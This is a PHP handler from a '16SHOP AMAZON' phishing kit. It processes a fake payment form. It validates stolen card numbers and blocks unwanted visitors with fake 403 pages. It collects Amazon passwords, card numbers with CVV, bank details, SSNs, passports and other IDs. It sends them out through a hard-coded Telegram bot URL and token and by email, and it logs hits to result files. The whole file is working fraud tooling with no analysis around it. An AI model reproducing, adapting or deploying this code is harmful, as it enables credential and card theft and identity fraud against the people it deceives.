<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
require_once('../session.php');
$ip = getUserIP();
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "jcb"       => "/^35[0-9]{14}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else if (preg_match($cardtype['jcb'],$number))
    {
    $type= "jcb";
        return 'jcb';
    }
    else
    {
        return false;
    } 
 }
if($_POST['ccno'] == "") {
    tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$valid = validatecard($_POST['ccno']);
if($valid == false) {
    tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['exp_tahun'] < 20) {
    tulis_file("../security/onetime.dat","$ip");
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['exp_bulan'] > 12) {
    tulis_file("../security/onetime.dat","$ip");
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$antidouble = md5($_POST['ccno']);
$_SESSION['ending'] = substr($_POST['ccno'], -4);
$bin = check_bin($_POST['ccno']);
$ispuser = getisp($ip);
$message  = "#---------------------------[ 16SHOP AMAZON ]---------------------------#\n";
$message .= "#---------------------------[ AMAZON LOGIN ]-----------------------------#\n";
$message .= "Amazon	ID 		: ".$_SESSION['email']."\n";
$message .= "Password		: ".$_SESSION['password']."\n";
$message .= "#--------------------------------[ CARD DETAILS ]----------------------------#\n";
$message .= "Bank			: ".$bin["bank"]["name"]."\n";
$message .= "Type			: ".strtoupper($bin["scheme"])." - ".strtoupper($bin["type"])."\n";
$message .= "Level			: ".strtoupper($bin["brand"])."\n";
$message .= "Cardholders    : ".$_POST['ccname']."\n";
$message .= "CC Number		: ".$_POST['ccno']."\n";
$message .= "Expired		: ".$_POST['exp_bulan']."/".$_POST['exp_tahun']."\n";
$message .= "CVV			: ".$_POST['cvv']."\n";
$message .= "AMEX CID 		: ".$_POST['cid']."\n";
$message .= "Account Number	: ".$_POST['acno']."\n";
$message .= "Sort Code		: ".$_POST['sortcode']."\n";
$message .= "Credit Limit	: ".$_POST['climit']."\n";
$message .= "Copy Check Live : ".$_POST['ccno']."|".$_POST['exp_bulan']."|".$_POST['exp_tahun']."\n";
$message .= "#-------------------------------[ JAPAN INFO ]------------------------------------#\n";
$message .= "WEB ID						: ".$_POST['cardid']."\n";
$message .= "Card Password				: ".$_POST['passjp']."\n";
if($setting['get_billing'] == "on") {
$message .= "#-------------------------[ BILLING ADDRESS ]--------------------------------#\n";
$message .= "Full Name		: ".$_SESSION['fullname']."\n";
$message .= "Address		: ".$_SESSION['address']."\n";
$message .= "City			: ".$_SESSION['city']."\n";
$message .= "State			: ".$_SESSION['state']."\n";
$message .= "Country		: ".$_SESSION['country']."\n";
$message .= "Zip			: ".$_SESSION['zipcode']."\n";
$message .= "DOB			: ".$_SESSION['dob']."\n";
$message .= "Phone			: ".$_SESSION['phone']."\n";
$message .= "#------------------------[ ADDITIONAL INFORMATION ]------------------------#\n";
$message .= "ID Number					: ".$_SESSION['numbid']."\n";
$message .= "Civil ID					: ".$_SESSION['civilid']."\n";
$message .= "Qatar ID					: ".$_SESSION['qatarid']."\n";
$message .= "National ID				: ".$_SESSION['naid']."\n";
$message .= "Citizen ID					: ".$_SESSION['citizenid']."\n";
$message .= "Passport Number			: ".$_SESSION['passport']."\n";
$message .= "Bank Access Number         : ".$_SESSION['bans']."\n";
$message .= "Social Insurance Number	: ".$_SESSION['sin']."\n";
$message .= "Social Security Number		: ".$_SESSION['ssn']."\n";
$message .= "OSID Number				: ".$_SESSION['osidnumber']."\n";
}
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP			: ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ NEW SCAMA ]-----------------------------#\n";

$data = [
    'chat_id' => '-714535853',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot5162963581:AAG_5u2Be1UzB3VdAnRrYimfvggQPTxx7Lk/sendMessage?" . http_build_query($data) );
$_SESSION['email'] = $_POST['emailLogin'];
$bins = preg_replace('/\s/', '', $_POST['ccno']);
$bins = substr($bins,0,6);
$_SESSION['from'] = $_POST['fullname'];
if($setting['get_billing'] == "on") {
	$from = $_SESSION['fullname'];
}else{
	$from = $_POST['ccname'];
}
if($bin["brand"] == "") {
		$subject = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." [ $cn - $os - $ip ]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
}else{
		$subject = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." [ $cn - $os - $ip ]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
if($antidouble == $_SESSION['anti_double']) {
}else{
	kirim_mail($setting['email_result'],$from,$subject,$message);
	tulis_file("../result/total_cc.txt", $ip);
	tulis_file("../result/total_bin.txt","$subbin|$countrycode|$cn|$os\n");
	tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Mengisi Credit Card");
}
$_SESSION['anti_double'] = md5($_POST['ccno']);

if($_SESSION['cc_pertama'] == "udah") {
}else{
	if($setting['double_cc'] == "on") {
		$_SESSION['cc_pertama'] = "udah";
			echo "<script type='text/javascript'>window.top.location='../ap/payment?session=$key&error=1';</script>";
	}
}

if($setting['get_photo'] == "on") {
	echo "<script type='text/javascript'>window.top.location='../ap/verify_credit?session=$key';</script>";
	exit();
}else{
	echo "<script type='text/javascript'>window.top.location='../ap/done?session=$key';</script>";
exit();
}
?>
